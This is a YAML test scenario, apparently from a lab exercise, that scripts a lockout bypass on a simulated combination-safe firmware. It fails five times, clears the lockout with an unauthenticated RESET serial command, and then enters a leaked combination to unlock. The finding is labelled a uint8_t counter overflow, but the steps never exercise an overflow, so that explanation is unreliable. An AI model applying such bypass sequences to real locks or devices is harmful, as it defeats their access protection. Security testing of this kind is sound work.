name: "VULN-003: uint8_t Lockout Counter Overflow Bypasses Lockout"
version: 1
vulnerability:
  type: integer-overflow
  severity: high
  description: "The failCount variable is declared as uint8_t (line 148), which overflows from 255 back to 0. The lockout engages at 5 failed attempts, but after 256 total failed attempts the counter wraps to 0, and the lockout flag can be bypassed on a RESET command since failCount resets. More critically, if an attacker can push failCount past 255, it wraps to 0 and subsequent attempts won't trigger lockout (failCount < MAX_ATTEMPTS again)."
  exploit: "An attacker triggers the lockout (5 failures), then uses the RESET serial command to clear the lockout and failCount. However, the deeper vulnerability is that even without RESET, if failCount somehow reaches 256 (0 after overflow), the lockout check 'failCount >= MAX_ATTEMPTS' would fail since 0 < 5. We demonstrate by showing the counter increments toward overflow and that RESET (which sets failCount=0) enables unlimited retries, or we use DEBUG to observe the counter state after multiple failures."
  evidence: "After 5 failed attempts, lockout engages. After sending RESET, failCount goes back to 0 and the attacker can try again indefinitely, proving the uint8_t counter provides no lasting protection. The DEBUG command shows failCount value confirming the vulnerability."
  line_numbers: [148, 149, 150, 222, 223, 224, 225, 226, 253, 254, 255, 256]
steps:
  # Wait for boot
  - delay: 500
  - wait-serial: "=== COMBO SAFE v1.0 ==="
    timeout: 3000
  # --- Fail attempt 1 ---
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "Failed attempts: 1"
    timeout: 5000
  - delay: 2000
  # --- Fail attempt 2 ---
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "Failed attempts: 2"
    timeout: 5000
  - delay: 2000
  # --- Fail attempt 3 ---
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "Failed attempts: 3"
    timeout: 5000
  - delay: 2000
  # --- Fail attempt 4 ---
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "Failed attempts: 4"
    timeout: 5000
  - delay: 2000
  # --- Fail attempt 5 -> LOCKOUT ---
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "LOCKOUT ENGAGED"
    timeout: 5000
  # Confirm lockout via DEBUG - failCount should be 5
  - clear-serial: true
  - send-serial: "DEBUG"
  - wait-serial: "[debug] === END STATE ==="
    timeout: 5000
  - expect-serial: "[debug] failCount=5"
  - expect-serial: "[debug] lockedOut=1"
  # Now use RESET to bypass lockout - this works because failCount is trivially resettable
  # In a real overflow scenario, 256 failures would wrap failCount to 0
  - clear-serial: true
  - send-serial: "RESET"
  - wait-serial: "[safe] Reset complete"
    timeout: 5000
  # Verify failCount reset to 0 - lockout bypassed
  - clear-serial: true
  - send-serial: "DEBUG"
  - wait-serial: "[debug] === END STATE ==="
    timeout: 5000
  - expect-serial: "[debug] failCount=0"
  - expect-serial: "[debug] lockedOut=0"
  # Now we can try again - lockout completely bypassed
  # Enter correct combo 7-3-9 using leaked info
  - clear-serial: true
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 7
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 3
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 300
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 9
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 300
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - wait-serial: "[safe] UNLOCKED!"
    timeout: 5000
  - expect-serial: "UNLOCKED"
